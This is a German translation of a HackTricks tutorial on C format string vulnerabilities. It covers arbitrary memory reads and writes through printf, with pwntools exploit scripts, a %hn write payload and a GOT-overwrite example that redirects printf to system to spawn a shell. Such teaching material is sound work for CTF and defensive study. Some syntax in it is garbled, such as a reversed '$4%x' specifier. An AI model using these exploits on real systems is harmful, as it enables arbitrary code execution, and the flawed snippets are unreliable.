# Format Strings

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder m√∂chten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**HackTricks-Repository**](https://github.com/carlospolop/hacktricks) **und das** [**HackTricks-Cloud-Repository**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>

## Grundlegende Informationen

In C ist **`printf`** eine Funktion, die verwendet werden kann, um einen **String auszugeben**. Der **erste Parameter**, den diese Funktion erwartet, ist der **rohe Text mit den Formatierern**. Die **folgenden erwarteten Parameter** sind die **Werte**, die die **Formatierer** des Rohtexts **ersetzen** sollen.

Andere anf√§llige Funktionen sind **`sprintf()`** und **`fprintf()`**.

Die Verwundbarkeit tritt auf, wenn ein **Angreifertext als erster Argument** an diese Funktion √ºbergeben wird. Der Angreifer kann einen **speziellen Eingabe missbrauchen**, um die **F√§higkeiten der printf-Formatzeichenfolge** zu nutzen und beliebige Daten an **beliebiger Adresse zu lesen und zu schreiben (lesbar/schreibbar)**. Auf diese Weise kann er **beliebigen Code ausf√ºhren**.

#### Formatierer:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%p ‚Äî> Pointer
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**Beispiele:**

* Verwundbares Beispiel:
```c
char buffer[30];
gets(buffer);  // Dangerous: takes user input without restrictions.
printf(buffer);  // If buffer contains "%x", it reads from the stack.
```
* Normale Verwendung:
```c
int value = 1205;
printf("%x %x %x", value, value, value);  // Outputs: 4b5 4b5 4b5
```
* Mit fehlenden Argumenten:
```c
printf("%x %x %x", value);  // Unexpected output: reads random values from the stack.
```
* fprintf anf√§llig:
```c
#include <stdio.h>

int main(int argc, char *argv[]) {
char *user_input;
user_input = argv[1];
FILE *output_file = fopen("output.txt", "w");
fprintf(output_file, user_input); // The user input cna include formatters!
fclose(output_file);
return 0;
}
```
### **Zugriff auf Zeiger**

Das Format **`%<n>$x`**, wobei `n` eine Zahl ist, erm√∂glicht es printf anzuweisen, den n-ten Parameter (vom Stack) auszuw√§hlen. Wenn Sie also den vierten Parameter vom Stack mit printf lesen m√∂chten, k√∂nnten Sie Folgendes tun:
```c
printf("%x %x %x %x")
```
und Sie w√ºrden vom ersten bis zum vierten Parameter lesen. 

Oder Sie k√∂nnten Folgendes tun:
```c
printf("$4%x")
```
und lesen Sie direkt den vierten.

Beachten Sie, dass der Angreifer den `pr`**`intf`-Parameter kontrolliert, was im Grunde bedeutet, dass** seine Eingabe im Stapel liegt, wenn `printf` aufgerufen wird, was bedeutet, dass er spezifische Speicheradressen im Stapel schreiben k√∂nnte.

{% hint style="danger" %}
Ein Angreifer, der diese Eingabe kontrolliert, kann **beliebige Adressen im Stapel hinzuf√ºgen und `printf` dazu bringen, darauf zuzugreifen**. Im n√§chsten Abschnitt wird erl√§utert, wie dieses Verhalten genutzt werden kann.
{% endhint %}

## **Beliebiges Lesen**

Es ist m√∂glich, den Formatter **`%n$s`** zu verwenden, um **`printf`** die **Adresse** zu erhalten, die sich an der **n-Position** befindet, und sie dann zu **drucken, als ob es ein String w√§re** (drucken, bis eine 0x00 gefunden wird). Wenn die Basisadresse der Bin√§rdatei **`0x8048000`** ist und wir wissen, dass die Benutzereingabe an der 4. Position im Stapel beginnt, ist es m√∂glich, den Anfang der Bin√§rdatei mit zu drucken:
```python
from pwn import *

p = process('./bin')

payload = b'%6$s' #4th param
payload += b'xxxx' #5th param (needed to fill 8bytes with the initial input)
payload += p32(0x8048000) #6th param

p.sendline(payload)
log.info(p.clean()) # b'\x7fELF\x01\x01\x01||||'
```
{% hint style="danger" %}
Beachten Sie, dass Sie die Adresse 0x8048000 nicht am Anfang der Eingabe platzieren k√∂nnen, da die Zeichenfolge am Ende dieser Adresse mit 0x00 abgeschnitten wird.
{% endhint %}

### Offset finden

Um den Offset f√ºr Ihre Eingabe zu finden, k√∂nnten Sie 4 oder 8 Bytes (`0x41414141`) senden, gefolgt von **`%1$x`** und den Wert **erh√∂hen**, bis die `A's` zur√ºckgegeben werden.

<details>

<summary>Brute-Force-Printf-Offset</summary>
```python
# Code from https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak

from pwn import *

# Iterate over a range of integers
for i in range(10):
# Construct a payload that includes the current integer as offset
payload = f"AAAA%{i}$x".encode()

# Start a new process of the "chall" binary
p = process("./chall")

# Send the payload to the process
p.sendline(payload)

# Read and store the output of the process
output = p.clean()

# Check if the string "41414141" (hexadecimal representation of "AAAA") is in the output
if b"41414141" in output:
# If the string is found, log the success message and break out of the loop
log.success(f"User input is at offset : {i}")
break

# Close the process
p.close()
```
</details>

### Wie n√ºtzlich

Arbitr√§re Lesevorg√§nge k√∂nnen n√ºtzlich sein, um:

* **Den** **Bin√§rcode** aus dem Speicher zu **dumpen**
* **Auf spezifische Speicherbereiche zuzugreifen, in denen sensible** **Informationen** gespeichert sind (wie Pr√ºfsummen, Verschl√ºsselungsschl√ºssel oder benutzerdefinierte Passw√∂rter wie in dieser [**CTF-Herausforderung**](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak#read-arbitrary-value))

## **Arbitr√§res Schreiben**

Der Formatter **`$<num>%n`** **schreibt** die **Anzahl der geschriebenen Bytes** in die **angegebene Adresse** im \<num> Parameter im Stapel. Wenn ein Angreifer so viele Zeichen wie m√∂glich mit printf schreiben kann, wird er in der Lage sein, **`$<num>%n`** dazu zu bringen, eine beliebige Zahl an einer beliebigen Adresse zu schreiben.

Gl√ºcklicherweise ist es nicht erforderlich, 9999 "A"s zur Eingabe hinzuzuf√ºgen, um die Zahl 9999 zu schreiben. Stattdessen ist es m√∂glich, den Formatter **`%.<num-write>%<num>$n`** zu verwenden, um die Zahl **`<num-write>`** in die **Adresse zu schreiben, auf die die Position `num` zeigt**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
Jedoch ist zu beachten, dass normalerweise zur Angabe einer Adresse wie `0x08049724` (was eine RIESIGE Zahl ist, um sie auf einmal zu schreiben), **`$hn`** anstelle von `$n` verwendet wird. Dies erm√∂glicht es, **nur 2 Bytes zu schreiben**. Daher wird diese Operation zweimal durchgef√ºhrt, einmal f√ºr die h√∂chsten 2 Bytes der Adresse und ein weiteres Mal f√ºr die niedrigeren.

Daher erm√∂glicht diese Schwachstelle, **beliebige Daten an beliebige Adressen zu schreiben (beliebiges Schreiben)**.

In diesem Beispiel soll das Ziel sein, die **Adresse** einer **Funktion** in der **GOT-Tabelle** zu **√ºberschreiben**, die sp√§ter aufgerufen wird. Obwohl dies auch andere Techniken zum Ausf√ºhren von beliebigem Code durch beliebiges Schreiben ausnutzen k√∂nnte:

{% content-ref url="../arbitrary-write-2-exec/" %}
[arbitrary-write-2-exec](../arbitrary-write-2-exec/)
{% endcontent-ref %}

Wir werden eine **Funktion √ºberschreiben**, die ihre **Argumente** vom **Benutzer erh√§lt** und sie auf die **`system`**-**Funktion** zeigt.\
Wie bereits erw√§hnt, sind in der Regel 2 Schritte erforderlich, um die Adresse zu schreiben: Sie schreiben zuerst 2 Bytes der Adresse und dann die anderen 2. Dazu wird **`$hn`** verwendet.

* **HOB** wird f√ºr die 2 h√∂heren Bytes der Adresse aufgerufen
* **LOB** wird f√ºr die 2 niedrigeren Bytes der Adresse aufgerufen

Dann, aufgrund der Funktionsweise von Formatstrings, m√ºssen Sie zuerst das kleinere von \[HOB, LOB] schreiben und dann das andere.

Wenn HOB < LOB\
`[Adresse+2][Adresse]%.[HOB-8]x%[Offset]\$hn%.[LOB-HOB]x%[Offset+1]`

Wenn HOB > LOB\
`[Adresse+2][Adresse]%.[LOB-8]x%[Offset+1]\$hn%.[HOB-LOB]x%[Offset]`

HOB LOB HOB\_Shellcode-8 N¬∫Param\_dir\_HOB LOB\_Shell-HOB\_Shell N¬∫Param\_dir\_LOB

{% code overflow="wrap" %}
```bash
python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'
```
{% endcode %}

### Pwntools Vorlage

Sie k√∂nnen eine **Vorlage** finden, um einen Exploit f√ºr diese Art von Schwachstelle vorzubereiten unter:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

Oder dieses grundlegende Beispiel von [**hier**](https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite):
```python
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7dc2000       # ASLR disabled

p = process()

payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.clean()

p.sendline('/bin/sh')

p.interactive()
```
## Format Strings zu BOF

Es ist m√∂glich, die Schreibaktionen einer Format-String-Schwachstelle zu missbrauchen, um **Adressen des Stacks zu schreiben** und eine Schwachstelle vom Typ **Buffer Overflow** auszunutzen.

## Weitere Beispiele & Referenzen

* [https://ir0nstone.gitbook.io/notes/types/stack/format-string](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
* [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)
* [https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak)
* [https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html)
* 32 Bit, kein Relro, kein Canary, NX, kein PIE, grundlegende Verwendung von Format-Strings zum Auslesen der Flagge vom Stack (keine Notwendigkeit, den Ausf√ºhrungsfluss zu √§ndern)
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32 Bit, Relro, kein Canary, NX, kein PIE, Format-String zum √úberschreiben der Adresse `fflush` mit der Win-Funktion (ret2win)
* [https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html)
* 32 Bit, Relro, kein Canary, NX, kein PIE, Format-String zum Schreiben einer Adresse innerhalb von `main` in `.fini_array` (damit der Fluss 1 Mal mehr zur√ºckkehrt) und Schreiben der Adresse zu `system` in der GOT-Tabelle, die auf `strlen` zeigt. Wenn der Fluss zu `main` zur√ºckkehrt, wird `strlen` mit Benutzereingabe ausgef√ºhrt und zeigt auf `system`, es werden die √ºbergebenen Befehle ausgef√ºhrt.
